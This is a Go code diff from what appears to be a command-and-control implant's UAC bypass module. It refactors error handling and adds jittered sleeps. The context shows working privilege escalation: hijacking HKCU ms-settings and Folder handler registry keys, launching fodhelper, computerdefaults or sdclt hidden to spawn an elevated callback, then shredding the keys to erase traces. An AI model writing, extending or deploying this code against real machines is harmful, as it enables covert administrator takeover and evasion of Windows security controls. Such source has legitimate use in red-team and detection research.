@@ -38,11 +38,7 @@ func (c *UACBypassCommand) Execute(task structs.Task) structs.CommandResult {
 	var args uacBypassArgs
 	if task.Params != "" {
 		if err := json.Unmarshal([]byte(task.Params), &args); err != nil {
-			return structs.CommandResult{
-				Output:    fmt.Sprintf("Error parsing parameters: %v", err),
-				Status:    "error",
-				Completed: true,
-			}
+			return errorf("Error parsing parameters: %v", err)
 		}
 	}
 
@@ -52,22 +48,14 @@ func (c *UACBypassCommand) Execute(task structs.Task) structs.CommandResult {
 
 	// Check if already elevated — UAC bypass is unnecessary
 	if isElevated() {
-		return structs.CommandResult{
-			Output:    "Already running at high integrity (elevated). UAC bypass not needed.\nUse getsystem to escalate to SYSTEM.",
-			Status:    "success",
-			Completed: true,
-		}
+		return successResult("Already running at high integrity (elevated). UAC bypass not needed.\nUse getsystem to escalate to SYSTEM.")
 	}
 
 	// Default: spawn a new copy of ourselves for an elevated callback
 	if args.Command == "" {
 		exe, err := os.Executable()
 		if err != nil {
-			return structs.CommandResult{
-				Output:    fmt.Sprintf("Error getting executable path: %v", err),
-				Status:    "error",
-				Completed: true,
-			}
+			return errorf("Error getting executable path: %v", err)
 		}
 		args.Command = exe
 	}
@@ -80,11 +68,7 @@ func (c *UACBypassCommand) Execute(task structs.Task) structs.CommandResult {
 	case "sdclt":
 		return uacBypassSdclt(args.Command)
 	default:
-		return structs.CommandResult{
-			Output:    fmt.Sprintf("Unknown technique: %s. Use: fodhelper, computerdefaults, sdclt", args.Technique),
-			Status:    "error",
-			Completed: true,
-		}
+		return errorf("Unknown technique: %s. Use: fodhelper, computerdefaults, sdclt", args.Technique)
 	}
 }
 
@@ -127,21 +111,13 @@ func uacBypassMsSettings(command, triggerBinary, techniqueName string) structs.C
 	output += "[*] Step 1: Setting registry key...\n"
 	key, _, err := registry.CreateKey(registry.CURRENT_USER, regKeyPath, registry.SET_VALUE)
 	if err != nil {
-		return structs.CommandResult{
-			Output:    output + fmt.Sprintf("Error creating HKCU\\%s: %v", regKeyPath, err),
-			Status:    "error",
-			Completed: true,
-		}
+		return errorResult(output + fmt.Sprintf("Error creating HKCU\\%s: %v", regKeyPath, err))
 	}
 
 	// Set (Default) value to our command
 	if err := key.SetStringValue("", command); err != nil {
 		key.Close()
-		return structs.CommandResult{
-			Output:    output + fmt.Sprintf("Error setting command value: %v", err),
-			Status:    "error",
-			Completed: true,
-		}
+		return errorResult(output + fmt.Sprintf("Error setting command value: %v", err))
 	}
 
 	// Set DelegateExecute to empty string — this is critical.
@@ -150,11 +126,7 @@ func uacBypassMsSettings(command, triggerBinary, techniqueName string) structs.C
 	if err := key.SetStringValue("DelegateExecute", ""); err != nil {
 		key.Close()
 		cleanupMsSettingsKey()
-		return structs.CommandResult{
-			Output:    output + fmt.Sprintf("Error setting DelegateExecute: %v", err),
-			Status:    "error",
-			Completed: true,
-		}
+		return errorResult(output + fmt.Sprintf("Error setting DelegateExecute: %v", err))
 	}
 	key.Close()
 	output += fmt.Sprintf("[+] Registry set: HKCU\\%s\n", regKeyPath)
@@ -169,16 +141,12 @@ func uacBypassMsSettings(command, triggerBinary, techniqueName string) structs.C
 	err = windows.ShellExecute(0, verbPtr, filePtr, nil, nil, 0 /* SW_HIDE */)
 	if err != nil {
 		cleanupMsSettingsKey()
-		return structs.CommandResult{
-			Output:    output + fmt.Sprintf("Error launching %s: %v", triggerBinary, err),
-			Status:    "error",
-			Completed: true,
-		}
+		return errorResult(output + fmt.Sprintf("Error launching %s: %v", triggerBinary, err))
 	}
 	output += fmt.Sprintf("[+] Launched %s via ShellExecute\n", triggerBinary)
 
 	// Step 3: Wait briefly then clean up registry
-	time.Sleep(2 * time.Second)
+	jitterSleep(1500*time.Millisecond, 3*time.Second)
 	output += "[*] Step 3: Cleaning up registry (shredding values)...\n"
 	cleanupMsSettingsKey()
 	output += "[+] Registry keys shredded and removed\n\n"
@@ -187,11 +155,7 @@ func uacBypassMsSettings(command, triggerBinary, techniqueName string) structs.C
 	output += "[*] If successful, a new elevated callback should appear shortly.\n"
 	output += "[*] The elevated process runs at high integrity (admin)."
 
-	return structs.CommandResult{
-		Output:    output,
-		Status:    "success",
-		Completed: true,
-	}
+	return successResult(output)
 }
 
 // cleanupMsSettingsKey shreds values and removes the ms-settings hijack registry keys
@@ -220,32 +184,20 @@ func uacBypassSdclt(command string) structs.CommandResult {
 	output += "[*] Step 1: Setting registry key...\n"
 	key, _, err := registry.CreateKey(registry.CURRENT_USER, regKeyPath, registry.SET_VALUE)
 	if err != nil {
-		return structs.CommandResult{
-			Output:    output + fmt.Sprintf("Error creating HKCU\\%s: %v", regKeyPath, err),
-			Status:    "error",
-			Completed: true,
-		}
+		return errorResult(output + fmt.Sprintf("Error creating HKCU\\%s: %v", regKeyPath, err))
 	}
 
 	// Set (Default) value to our command
 	if err := key.SetStringValue("", command); err != nil {
 		key.Close()
-		return structs.CommandResult{
-			Output:    output + fmt.Sprintf("Error setting command value: %v", err),
-			Status:    "error",
-			Completed: true,
-		}
+		return errorResult(output + fmt.Sprintf("Error setting command value: %v", err))
 	}
 
 	// DelegateExecute must be set (empty string) for the Folder handler too
 	if err := key.SetStringValue("DelegateExecute", ""); err != nil {
 		key.Close()
 		cleanupSdcltKey()
-		return structs.CommandResult{
-			Output:    output + fmt.Sprintf("Error setting DelegateExecute: %v", err),
-			Status:    "error",
-			Completed: true,
-		}
+		return errorResult(output + fmt.Sprintf("Error setting DelegateExecute: %v", err))
 	}
 	key.Close()
 	output += fmt.Sprintf("[+] Registry set: HKCU\\%s\n", regKeyPath)
@@ -257,16 +209,12 @@ func uacBypassSdclt(command string) structs.CommandResult {
 	err = windows.ShellExecute(0, verbPtr, filePtr, nil, nil, 0 /* SW_HIDE */)
 	if err != nil {
 		cleanupSdcltKey()
-		return structs.CommandResult{
-			Output:    output + fmt.Sprintf("Error launching sdclt.exe: %v", err),
-			Status:    "error",
-			Completed: true,
-		}
+		return errorResult(output + fmt.Sprintf("Error launching sdclt.exe: %v", err))
 	}
 	output += "[+] Launched sdclt.exe via ShellExecute\n"
 
 	// Step 3: Wait briefly then clean up registry
-	time.Sleep(2 * time.Second)
+	jitterSleep(1500*time.Millisecond, 3*time.Second)
 	output += "[*] Step 3: Cleaning up registry (shredding values)...\n"
 	cleanupSdcltKey()
 	output += "[+] Registry keys shredded and removed\n\n"
@@ -275,11 +223,7 @@ func uacBypassSdclt(command string) structs.CommandResult {
 	output += "[*] If successful, a new elevated callback should appear shortly.\n"
 	output += "[*] The elevated process runs at high integrity (admin)."
 
-	return structs.CommandResult{
-		Output:    output,
-		Status:    "success",
-		Completed: true,
-	}
+	return successResult(output)
 }
 
 // cleanupSdcltKey shreds values and removes the Folder handler hijack registry keys
